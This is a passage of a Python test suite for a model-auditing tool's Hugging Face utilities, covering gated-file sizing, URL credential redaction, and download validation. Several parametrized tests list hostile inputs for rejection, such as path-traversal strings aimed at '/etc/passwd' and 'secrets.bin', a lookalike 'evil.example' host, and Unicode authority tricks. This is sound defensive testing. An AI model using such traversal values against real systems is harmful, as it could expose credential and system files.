    def test_get_model_info_counts_unknown_size_for_gated_selected_file(
        self,
        mock_hf_api_class: MagicMock,
    ) -> None:
        """Gated selected files with no disclosed size should be gated and unknown-size."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            gated="auto",
            siblings=[SimpleNamespace(rfilename="model.safetensors", size=None, lfs=None)],
        )
        mock_api.get_paths_info.side_effect = RuntimeError("403 Forbidden: gated repository")

        info = get_model_info("https://huggingface.co/test/model")

        assert info["inventory_status"] == "gated_inaccessible"
        assert info["total_size"] == 0
        assert info["accessible_size"] == 0
        assert info["inaccessible_gated_bytes"] == 0
        assert info["inaccessible_gated_file_count"] == 1
        assert info["inaccessible_gated_files"] == ["model.safetensors"]
        assert info["unknown_size_count"] == 1
        assert info["unknown_size_files"] == ["model.safetensors"]
        assert info["files"] == [{"name": "model.safetensors", "size": None, "access": "gated"}]

    @pytest.mark.parametrize("selected_sizes", [{}, {"model.safetensors": None}])
    def test_get_model_info_counts_missing_path_size_metadata_for_gated_selected_file(
        self,
        selected_sizes: dict[str, int | None],
    ) -> None:
        """Gated selected files with absent path-size metadata should use disclosed LFS size."""
        mock_api = MagicMock()
        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            gated="auto",
            siblings=[SimpleNamespace(rfilename="model.safetensors", size=None, lfs=SimpleNamespace(size=4096))],
        )

        with (
            patch("huggingface_hub.HfApi", return_value=mock_api),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                return_value=(selected_sizes, _HF_TEST_REVISION),
            ),
        ):
            info = get_model_info("https://huggingface.co/test/model")

        assert info["inventory_status"] == "gated_inaccessible"
        assert info["total_size"] == 4096
        assert info["accessible_size"] == 0
        assert info["inaccessible_gated_bytes"] == 4096
        assert info["inaccessible_gated_file_count"] == 1
        assert info["inaccessible_gated_files"] == ["model.safetensors"]
        assert info["unknown_size_count"] == 0
        assert info["files"] == [{"name": "model.safetensors", "size": 4096, "access": "gated"}]

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_counts_unknown_size_for_gated_probe_candidate(
        self,
        mock_hf_api_class: MagicMock,
    ) -> None:
        """Gated probe candidates without size metadata should not preview as known zero bytes."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            gated="auto",
            siblings=[SimpleNamespace(rfilename="hidden.payload", size=None, lfs=None)],
        )
        mock_api.get_paths_info.return_value = [SimpleNamespace(path="hidden.payload", size=None)]

        with patch(
            "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
            side_effect=PermissionError("401 Unauthorized: gated file https://huggingface.co/test/model?token=secret"),
        ) as mock_detect_content:
            info = get_model_info("https://huggingface.co/test/model")

        assert info["inventory_status"] == "gated_inaccessible"
        assert info["total_size"] == 0
        assert info["accessible_size"] == 0
        assert info["inaccessible_gated_bytes"] == 0
        assert info["inaccessible_gated_file_count"] == 1
        assert info["inaccessible_gated_files"] == ["hidden.payload"]
        assert info["unknown_size_count"] == 1
        assert info["unknown_size_files"] == ["hidden.payload"]
        assert info["files"] == [{"name": "hidden.payload", "size": None, "access": "gated"}]
        mock_detect_content.assert_called_once_with("test/model", "hidden.payload", _HF_TEST_REVISION, ANY)

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_marks_mixed_gated_content_probe_inventory_incomplete(
        self,
        mock_hf_api_class: MagicMock,
    ) -> None:
        """Mixed gated probe candidates must remain visible beside selected files."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            gated="auto",
            siblings=[
                SimpleNamespace(rfilename=".gitattributes", size=64),
                SimpleNamespace(rfilename="model.safetensors", size=1000),
                SimpleNamespace(rfilename="hidden.payload", size=None, lfs=SimpleNamespace(size=4096)),
            ],
        )
        mock_api.get_paths_info.return_value = [SimpleNamespace(path="model.safetensors", size=1000)]

        with (
            patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"}),
            patch(
                "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
                side_effect=PermissionError("403 Forbidden: gated file https://huggingface.co/test/model?token=secret"),
            ) as mock_detect_content,
        ):
            info = get_model_info("https://huggingface.co/test/model")

        assert info["inventory_status"] == "gated_inaccessible"
        assert info["total_size"] == 5096
        assert info["accessible_size"] == 1000
        assert info["inaccessible_gated_bytes"] == 4096
        assert info["inaccessible_gated_file_count"] == 1
        assert info["inaccessible_gated_files"] == ["hidden.payload"]
        assert info["unknown_size_count"] == 0
        assert info["file_count"] == 2
        assert info["files"] == [
            {"name": "model.safetensors", "size": 1000, "access": "available"},
            {"name": "hidden.payload", "size": 4096, "access": "gated"},
        ]
        mock_api.get_paths_info.assert_called_once_with(
            "test/model",
            ["model.safetensors", "hidden.payload"],
            revision=_HF_TEST_REVISION,
        )
        mock_detect_content.assert_called_once_with("test/model", "hidden.payload", _HF_TEST_REVISION, ANY)

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_distinguishes_gated_inaccessible_bytes(
        self,
        mock_hf_api_class: MagicMock,
    ) -> None:
        """Gated selected sizes should be explicit instead of reported as zero."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            gated="auto",
            siblings=[
                SimpleNamespace(rfilename="config.json", size=20),
                SimpleNamespace(rfilename="model.safetensors", size=None, lfs=SimpleNamespace(size=4096)),
                SimpleNamespace(rfilename="assets/preview.png", size=500),
            ],
        )
        mock_api.get_paths_info.side_effect = RuntimeError(
            "401 Unauthorized: Cannot access gated repo https://huggingface.co/test/model?token=secret"
        )

        with patch(
            "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
            side_effect=ValueError("Hugging Face selective filtering incomplete: unable to inspect skipped file (401)"),
        ) as mock_detect_content:
            info = get_model_info("https://huggingface.co/test/model")

        assert info["inventory_status"] == "gated_inaccessible"
        assert info["total_size"] == 4616
        assert info["accessible_size"] == 0
        assert info["inaccessible_gated_bytes"] == 4616
        assert info["inaccessible_gated_file_count"] == 3
        assert info["inaccessible_gated_files"] == ["config.json", "model.safetensors", "assets/preview.png"]
        assert info["unknown_size_count"] == 0
        assert info["files"] == [
            {"name": "config.json", "size": 20, "access": "gated"},
            {"name": "model.safetensors", "size": 4096, "access": "gated"},
            {"name": "assets/preview.png", "size": 500, "access": "gated"},
        ]
        assert "secret" not in str(info["inventory_error"])
        mock_detect_content.assert_called_once_with("test/model", "assets/preview.png", _HF_TEST_REVISION, ANY)

    @pytest.mark.integration
    @pytest.mark.skipif(
        os.environ.get("MODELAUDIT_RUN_HF_REAL_REPRO") != "1",
        reason="set MODELAUDIT_RUN_HF_REAL_REPRO=1 to run pinned Hugging Face reproduction",
    )
    def test_real_hf_rank18_pinned_inventory_and_bounded_scan(self, tmp_path: Path) -> None:
        """Pinned rank 18 reproduction without downloading model weights."""
        from huggingface_hub import HfApi, hf_hub_download

        from modelaudit.core import scan_model_directory_or_file

        repo_id = "hexgrad/Kokoro-82M"
        revision = "f3ff3571791e39611d31c381e3a41a3af07b4987"
        api = HfApi()
        repo_info = api.repo_info(repo_id, revision=revision, files_metadata=True)
        repo_files = _extract_huggingface_repo_files(repo_info)
        assert getattr(repo_info, "sha", None) == revision
        assert repo_files is not None

        info = _build_huggingface_model_info(repo_id, repo_info, repo_files, revision)

        assert info["inventory_status"] == "complete"
        assert info["file_count"] == 63
        assert info["total_size"] == 358_025_999
        config_info = next(file_info for file_info in info["files"] if file_info["name"] == "config.json")
        assert config_info["size"] <= 10 * 1024 * 1024

        downloaded_config = Path(
            hf_hub_download(
                repo_id=repo_id,
                filename="config.json",
                revision=revision,
                local_dir=tmp_path / "hf-real-repro",
            )
        )
        assert downloaded_config.stat().st_size == config_info["size"]

        result = scan_model_directory_or_file(str(downloaded_config), cache_enabled=False)

        assert result.files_scanned == 1
        assert result.bytes_scanned == downloaded_config.stat().st_size


class TestHuggingFaceFileURLs:
    """Test HuggingFace direct file URL handling."""

    def test_redact_file_url_for_display(self):
        """Redact credentials from HuggingFace URLs while keeping useful location context."""
        url = "https://user:pass@huggingface.co/org/repo/resolve/main/model.bin?token=hf_secret#frag"

        redacted = redact_huggingface_url_for_display(url)

        assert redacted == "https://huggingface.co/org/repo/resolve/main/model.bin"
        assert "user" not in redacted
        assert "pass" not in redacted
        assert "token=" not in redacted
        assert "hf_secret" not in redacted
        assert "#frag" not in redacted

    def test_invalid_host_error_redacts_credentials_and_query(self) -> None:
        """Rejected lookalike hosts must not echo secrets in validation errors."""
        url = "https://alice:password@evil.example/org/repo/resolve/main/model.bin?token=secret#frag"

        with pytest.raises(ValueError) as exc_info:
            parse_huggingface_file_url(url)

        message = str(exc_info.value)
        assert "evil.example/org/repo/resolve/main/model.bin" in message
        assert "alice" not in message
        assert "password" not in message
        assert "token=" not in message
        assert "secret" not in message

    @pytest.mark.parametrize(
        "url",
        [
            "ftp://alice:password@huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
            "https:huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
            "https:alice:password@huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
            "javascript:huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
            "huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
            "https://alice:password@huggingface.co\uff0fevil/org/repo/resolve/main/model.bin?token=secret#frag",
            "https://alice:password\uff20huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
        ],
    )
    def test_invalid_url_error_redacts_credentials_and_query(self, url: str) -> None:
        """Rejected schemes, authorities, and netlocs must not echo embedded secrets."""

        with pytest.raises(ValueError) as exc_info:
            parse_huggingface_file_url(url)

        message = str(exc_info.value)
        assert "alice" not in message
        assert "password" not in message
        assert "token=" not in message
        assert "secret" not in message

    def test_valid_file_urls(self) -> None:
        """Test that valid HuggingFace file URLs are detected."""
        valid_urls = [
            "https://huggingface.co/gpt2/resolve/main/config.json",
            "https://huggingface.co/bert-base/uncased/resolve/main/pytorch_model.bin",
            "https://huggingface.co/facebook/bart-large/resolve/main/config.json",
            "https://hf.co/microsoft/DialoGPT/resolve/main/model.safetensors",
            "https://hf.co/facebook/bart-large/resolve/main/subfolder/model.safetensors",
            "https://huggingface.co/user/repo/resolve/refs%2Fpr%2F1/file.bin",
            "https://huggingface.co/user/repo/resolve/feature%2Ffoo/file.bin",
            "https://huggingface.co/user/repo/resolve/v1.0/model%20file.bin",
            "https://user:pass@huggingface.co/private/repo/resolve/main/model.bin?token=hf_secret",
        ]
        for url in valid_urls:
            assert is_huggingface_file_url(url), f"Failed to detect valid file URL: {url}"

    def test_invalid_file_urls(self) -> None:
        """Test that invalid URLs are not detected as HuggingFace file URLs."""
        invalid_urls = [
            "https://huggingface.co/bert-base-uncased",  # Model URL, not file URL
            "https://github.com/user/repo/blob/main/file.bin",  # GitHub, not HuggingFace
            "https://huggingface.co/model/tree/main",  # Tree view, not resolve
            "/path/to/local/file.bin",  # Local path
        ]
        for url in invalid_urls:
            assert not is_huggingface_file_url(url), f"Incorrectly detected invalid file URL: {url}"

    def test_parse_file_urls(self) -> None:
        """Test parsing HuggingFace file URLs."""
        test_cases = [
            (
                "https://huggingface.co/gpt2/resolve/main/config.json",
                ("gpt2", "main", "config.json"),
            ),
            (
                f"https://huggingface.co/{'a' * 47}/{'b' * 48}/resolve/main/model.bin",
                (f"{'a' * 47}/{'b' * 48}", "main", "model.bin"),
            ),
            (
                "https://huggingface.co/bert-base/uncased/resolve/main/pytorch_model.bin",
                ("bert-base/uncased", "main", "pytorch_model.bin"),
            ),
            (
                "https://huggingface.co/microsoft/DialoGPT/resolve/v1.0/config.json",
                ("microsoft/DialoGPT", "v1.0", "config.json"),
            ),
            (
                "https://hf.co/facebook/bart-large/resolve/main/subfolder/model.safetensors",
                ("facebook/bart-large", "main", "subfolder/model.safetensors"),
            ),
            (
                "https://huggingface.co/user/repo/resolve/refs%2Fpr%2F1/file.bin",
                ("user/repo", "refs/pr/1", "file.bin"),
            ),
            (
                "https://huggingface.co/user/repo/resolve/feature%2Ffoo/file.bin",
                ("user/repo", "feature/foo", "file.bin"),
            ),
            (
                "https://huggingface.co/user/repo/resolve/v1.0/model%20file.bin",
                ("user/repo", "v1.0", "model file.bin"),
            ),
            (
                "https://user:pass@huggingface.co/private/repo/resolve/main/model.bin?token=hf_secret",
                ("private/repo", "main", "model.bin"),
            ),
        ]
        for url, expected in test_cases:
            repo_id, branch, filename = parse_huggingface_file_url(url)
            assert (repo_id, branch, filename) == expected, f"Failed to parse file URL: {url}"

    def test_parse_invalid_file_urls(self) -> None:
        """Test that invalid file URLs raise ValueError."""
        invalid_urls = [
            "https://github.com/user/repo/blob/main/file.bin",
            "https://huggingface.co/model",  # Missing resolve path
            "https://huggingface.co/model/tree/main/file.bin",  # Wrong path structure
        ]
        for url in invalid_urls:
            with pytest.raises(ValueError):
                parse_huggingface_file_url(url)

    @pytest.mark.parametrize(
        "url",
        [
            "https://huggingface.co/%2e%2e/repo/resolve/main/model.bin",
            "https://huggingface.co/org/%2e%2e/resolve/main/model.bin",
            "https://huggingface.co/org/repo%2Fescape/resolve/main/model.bin",
        ],
    )
    def test_parse_file_url_rejects_unsafe_repo_components(self, url: str) -> None:
        """Direct file URLs should validate repo-id components before download."""
        with pytest.raises(ValueError):
            parse_huggingface_file_url(url)

        assert is_huggingface_file_url(url) is False

    @pytest.mark.parametrize(
        "url",
        [
            "https://huggingface.co/test/model/resolve/%2e%2e/model.bin",
            "https://huggingface.co/test/model/resolve/%2e%2e%2Fmain/model.bin",
            "https://huggingface.co/test/model/resolve/refs%2F..%2Fmain/model.bin",
            "https://huggingface.co/test/model/resolve/%2Fmain/model.bin",
            "https://huggingface.co/test/model/resolve/main%2F/model.bin",
            "https://huggingface.co/test/model/resolve/refs%2F%2Fmain/model.bin",
            "https://huggingface.co/test/model/resolve/refs%5Cmain/model.bin",
            "https://huggingface.co/test/model/resolve/main/%2e%2e%2Fsecrets.bin",
            "https://huggingface.co/test/model/resolve/main/subdir%2Fmodel.bin",
            "https://huggingface.co/test/model/resolve/main/%2Fetc%2Fpasswd",
            "https://huggingface.co/test/model/resolve/main/../model.bin",
            "https://huggingface.co/test/model/resolve/main//model.bin",
            "https://huggingface.co/test/model/resolve/main/model.bin/",
        ],
    )
    def test_parse_file_url_rejects_unsafe_revision_or_filename_components(self, url: str) -> None:
        """Direct file URLs must not smuggle traversal or separators into SDK paths."""
        with pytest.raises(ValueError):
            parse_huggingface_file_url(url)

        assert is_huggingface_file_url(url) is False

    @pytest.mark.parametrize(
        "url",
        [
            "ftp://huggingface.co/test/model/resolve/main/model.bin",
            "//huggingface.co/test/model/resolve/main/model.bin",
            "https://huggingface.co:invalid/test/model/resolve/main/model.bin",
            "https://huggingface.co:444/test/model/resolve/main/model.bin",
            "https://huggingface.co/foo/resolve/resolve/main/file.bin",
            f"https://huggingface.co/{'a' * 48}/{'b' * 48}/resolve/main/model.bin",
            "https://huggingface.co/test%FF/model/resolve/main/model.bin",
            "https://huggingface.co/test/model/resolve/rev%FF/model.bin",
            "https://huggingface.co/test/model/resolve/main/model%FF.bin",
            "https://huggingface.co/test/model/resolve/main/model%00.bin",
            "https://huggingface.co/test/model/resolve/rev%/model.bin",
            "https://huggingface.co/test/model/resolve/main/model%ZZ.bin",
            "https://huggingface.co/test/model/resolve/%C2%85/model.bin",
            "https://huggingface.co/test/model/resolve/main/model%C2%85.bin",
            "https://huggingface.co/test/model/resolve/main/model\ud800.bin",
            "\x00https://huggingface.co/test/model/resolve/main/model.bin",
            " https://huggingface.co/test/model/resolve/main/model.bin",
            "https://huggingface.co/te\nst/model/resolve/main/model.bin",
            "https://huggingface.co/test/model/resolve/ma\tin/model.bin",
            "https://huggingface.co/test/model/resolve/main/model\r.bin",
        ],
    )
    def test_parse_file_url_rejects_ambiguous_or_sdk_invalid_components(self, url: str) -> None:
        """Validation should reject lossy decoding and repo IDs the SDK cannot accept."""
        with pytest.raises(ValueError):
            parse_huggingface_file_url(url)

        assert is_huggingface_file_url(url) is False

    @pytest.mark.parametrize(
        "filename",
        [
            "..%20",
            "C%3A",
            "CON",
            "CONIN%24",
            "conout%24.log",
            "COM%C2%B9",
            "LPT%C2%B2.log",
            "nul.txt",
            "model.bin.",
            "model.bin%20",
            "model.bin%3Astream",
            "model%3F.bin",
            "subdir%5Cmodel.bin",
        ],
    )
    def test_parse_file_url_rejects_windows_unsafe_filename_components(
        self,
        filename: str,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Windows device, drive, alias, and alternate-stream names must fail closed."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", True)
        url = f"https://huggingface.co/test/model/resolve/main/{filename}"

        with pytest.raises(ValueError, match="on Windows"):
            parse_huggingface_file_url(url)

        assert is_huggingface_file_url(url) is False

    def test_parse_file_url_preserves_posix_colon_filename(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Windows-only path restrictions should not reject a valid POSIX filename."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", False)

        assert parse_huggingface_file_url("https://huggingface.co/test/model/resolve/main/model.bin%3Astream") == (
            "test/model",
            "main",
            "model.bin:stream",
        )

    def test_parse_file_url_preserves_posix_backslash_filename(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A backslash is a literal POSIX filename character, not a path separator."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", False)

        assert parse_huggingface_file_url("https://huggingface.co/test/model/resolve/main/dir%5Cweights.bin") == (
            "test/model",
            "main",
            "dir\\weights.bin",
        )

    def test_parse_file_url_preserves_posix_colon_revision(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Windows-only cache path restrictions should not reject a POSIX revision."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", False)

        assert parse_huggingface_file_url("https://huggingface.co/test/model/resolve/release%3A1/model.bin") == (
            "test/model",
            "release:1",
            "model.bin",
        )

    @pytest.mark.parametrize(
        "revision",
        [
            "C%3A",
            "NUL",
            "refs%2FNUL%2F1",
            "refs%2FCOM%C2%B3%2F1",
            "branch.",
            "branch%20",
            "branch%3Fname",
        ],
    )
    def test_parse_file_url_rejects_windows_unsafe_revision_components(
        self,
        revision: str,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Revisions become SDK cache paths and must be Windows-safe component by component."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", True)
        url = f"https://huggingface.co/test/model/resolve/{revision}/model.bin"

        with pytest.raises(ValueError, match="on Windows"):
            parse_huggingface_file_url(url)

        assert is_huggingface_file_url(url) is False

    def test_parse_file_url_allows_windows_safe_slash_revision(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Valid PR refs remain supported when each cache-path component is safe."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", True)

        assert parse_huggingface_file_url("https://huggingface.co/test/model/resolve/refs%2Fpr%2F1/model.bin") == (
            "test/model",
            "refs/pr/1",
            "model.bin",
        )

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_rejects_windows_unsafe_revision_before_sdk(
        self,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Unsafe revision cache paths must fail before any SDK download."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", True)

        with pytest.raises(ValueError, match="revision path component on Windows"):
            download_file_from_hf("https://huggingface.co/test/model/resolve/C%3A/model.bin")

        mock_hf_hub_download.assert_not_called()

    def test_parse_file_url_accepts_default_https_port(self) -> None:
        """An explicit default transport port should preserve the same repository locator."""
        assert parse_huggingface_file_url("https://huggingface.co:443/test/model/resolve/main/model.bin") == (
            "test/model",
            "main",
            "model.bin",
        )

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_rejects_unsafe_direct_url_before_sdk_download(
        self,
        mock_hf_hub_download: MagicMock,
    ) -> None:
        """Unsafe decoded filename components should fail before the SDK download path."""
        with pytest.raises(ValueError, match="Invalid HuggingFace filename path component"):
            download_file_from_hf("https://huggingface.co/test/model/resolve/main/%2e%2e%2Fsecrets.bin")

        mock_hf_hub_download.assert_not_called()

    @pytest.mark.parametrize(
        "url",
        [
            f"https://huggingface.co/{'a' * 48}/{'b' * 48}/resolve/main/model.bin",
            "https://huggingface.co/test/model/resolve/main/model%FF.bin",
            "https://huggingface.co/test/model/resolve/main/model\n.bin",
        ],
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_rejects_sdk_invalid_direct_url_before_download(
        self,
        mock_hf_hub_download: MagicMock,
        url: str,
    ) -> None:
        """Repository, encoding, and raw URL validation must complete before the SDK call."""
        with pytest.raises(ValueError):
            download_file_from_hf(url)

        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_success(self, mock_hf_hub_download: MagicMock) -> None:
        """Test successful file download from HuggingFace."""
        mock_path = "/tmp/downloaded_file.bin"
        mock_hf_hub_download.return_value = mock_path

        url = "https://huggingface.co/test/model/resolve/main/pytorch_model.bin"
        result = download_file_from_hf(url)

        # Verify the download was called correctly
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="pytorch_model.bin",
            revision="main",
            cache_dir=None,
        )
        assert result == Path(mock_path)

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_allows_encoded_slash_revision(self, mock_hf_hub_download: MagicMock) -> None:
        """Legitimate PR refs should reach the SDK as decoded slash-containing revisions."""
        mock_hf_hub_download.return_value = "/tmp/downloaded_file.bin"

        result = download_file_from_hf(
            "https://huggingface.co/user/repo/resolve/refs%2Fpr%2F1/model.bin",
        )

        mock_hf_hub_download.assert_called_once_with(
            repo_id="user/repo",
            filename="model.bin",
            revision="refs/pr/1",
            cache_dir=None,
        )
        assert result == Path("/tmp/downloaded_file.bin")

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_cache_dir(self, mock_hf_hub_download: MagicMock, tmp_path: Path) -> None:
        """Test file download with custom cache directory."""
        mock_path = str(tmp_path / "downloaded_file.bin")
        mock_hf_hub_download.return_value = mock_path

        cache_dir = tmp_path / "custom_cache"
        url = "https://huggingface.co/test/model/resolve/main/config.json"
        download_file_from_hf(url, cache_dir=cache_dir)

        # Verify cache directory was used
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="config.json",
            revision="main",
            cache_dir=str(cache_dir),
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_huggingface_repo_files_paginated",
        side_effect=AssertionError("direct capped file download should not list the repository tree"),
    )
    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_preflights_before_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        mock_paginated_listing: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Direct file downloads should allow files exactly at the capped boundary."""
        downloaded_file = tmp_path / "downloaded_file.bin"
        downloaded_file.write_bytes(b"x" * 1024)
        mock_hf_hub_download.return_value = str(downloaded_file)
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(
            sha=TEST_COMMIT_SHA,
            siblings=[SimpleNamespace(rfilename="model.bin")],
        )
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(path="model.bin", size=1024)]

        result = download_file_from_hf(
            "https://huggingface.co/test/model/resolve/main/model.bin",
            max_size=1024,
        )

        mock_hf_api.return_value.repo_info.assert_called_once_with(
            "test/model",
            revision="main",
            files_metadata=False,
        )
        mock_hf_api.return_value.get_paths_info.assert_called_once_with(
            "test/model",
            ["model.bin"],
            revision=TEST_COMMIT_SHA,
        )
        mock_paginated_listing.assert_not_called()
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="model.bin",
            revision=TEST_COMMIT_SHA,
            cache_dir=None,
        )
        assert result == downloaded_file

    @patch(
        "modelaudit.utils.sources.huggingface._list_huggingface_repo_files_paginated",
        return_value=["pytorch_model.bin", "model.safetensors"],
    )
    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_fills_repository_file_inventory(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        mock_paginated_listing: MagicMock,
        tmp_path: Path,
    ) -> None:
        downloaded_file = tmp_path / "downloaded_file.bin"
        downloaded_file.write_bytes(b"weights")
        mock_hf_hub_download.return_value = str(downloaded_file)
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(
            sha=TEST_COMMIT_SHA,
            siblings=[
                SimpleNamespace(rfilename="pytorch_model.bin"),
                SimpleNamespace(rfilename="model.safetensors"),
            ],
        )
        mock_hf_api.return_value.get_paths_info.return_value = [
            SimpleNamespace(path="pytorch_model.bin", size=len(b"weights"))
        ]
        inventory: list[str] = []

        result = download_file_from_hf(
            "https://huggingface.co/test/model/resolve/main/pytorch_model.bin",
            max_size=1024,
            repository_file_inventory=inventory,
        )

        assert result == downloaded_file
        assert inventory == ["pytorch_model.bin", "model.safetensors"]
        mock_paginated_listing.assert_called_once_with("test/model", TEST_COMMIT_SHA, timeout_seconds=30.0)
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="pytorch_model.bin",
            revision=TEST_COMMIT_SHA,
            cache_dir=None,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_huggingface_repo_files_paginated",
        return_value=["pytorch_model.bin", "model.safetensors"],
    )
    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_inventory_pins_uncapped_download_to_listed_revision(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        mock_paginated_listing: MagicMock,
        tmp_path: Path,
    ) -> None:
        downloaded_file = tmp_path / "downloaded_file.bin"
        downloaded_file.write_bytes(b"weights")
        mock_hf_hub_download.return_value = str(downloaded_file)
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(
            sha=TEST_COMMIT_SHA,
            siblings=[
                SimpleNamespace(rfilename="pytorch_model.bin"),
                SimpleNamespace(rfilename="model.safetensors"),
            ],
        )
        inventory: list[str] = []

        result = download_file_from_hf(
            "https://huggingface.co/test/model/resolve/main/pytorch_model.bin",
            repository_file_inventory=inventory,
        )

        assert result == downloaded_file
        assert inventory == ["pytorch_model.bin", "model.safetensors"]
        mock_paginated_listing.assert_called_once_with("test/model", TEST_COMMIT_SHA, timeout_seconds=30.0)
        mock_hf_api.return_value.get_paths_info.assert_not_called()
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="pytorch_model.bin",
            revision=TEST_COMMIT_SHA,
            cache_dir=None,
        )

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_inventory_listing_failure_is_best_effort_without_size_cap(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        downloaded_file = tmp_path / "downloaded_file.bin"
        downloaded_file.write_bytes(b"weights")
        mock_hf_hub_download.return_value = str(downloaded_file)
        mock_hf_api.return_value.repo_info.side_effect = RuntimeError("offline")
        inventory: list[str] = []

        result = download_file_from_hf(
            "https://huggingface.co/test/model/resolve/main/pytorch_model.bin",
            repository_file_inventory=inventory,
        )

        assert result == downloaded_file
        assert inventory == []
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="pytorch_model.bin",
            revision="main",
            cache_dir=None,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_huggingface_repo_files_paginated",
        side_effect=AssertionError("direct capped file download should not list the repository tree"),
    )
    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_oversized_before_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        mock_paginated_listing: MagicMock,
    ) -> None:
        """Oversized direct files should not reach hf_hub_download."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(
            sha=TEST_COMMIT_SHA,
            siblings=[SimpleNamespace(rfilename="model.bin")],
        )
        mock_hf_api.return_value.get_paths_info.return_value = [
            SimpleNamespace(path="model.bin", size=11 * 1024 * 1024)
        ]

        with pytest.raises(Exception, match="exceeds maximum allowed size") as exc_info:
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=10 * 1024 * 1024,
            )

        assert "11.0 MB" in str(exc_info.value)
        assert "10.0 MB" in str(exc_info.value)
        mock_paginated_listing.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_huggingface_repo_files_paginated",
        side_effect=AssertionError("direct capped file download should not list the repository tree"),
    )
    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    @pytest.mark.parametrize("file_size", [None, -1, "1024", True])
    def test_download_file_with_max_size_rejects_invalid_size_before_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        mock_paginated_listing: MagicMock,
        file_size: object,
    ) -> None:
        """Capped direct files fail closed when HuggingFace metadata has no valid size."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(
            sha=TEST_COMMIT_SHA,
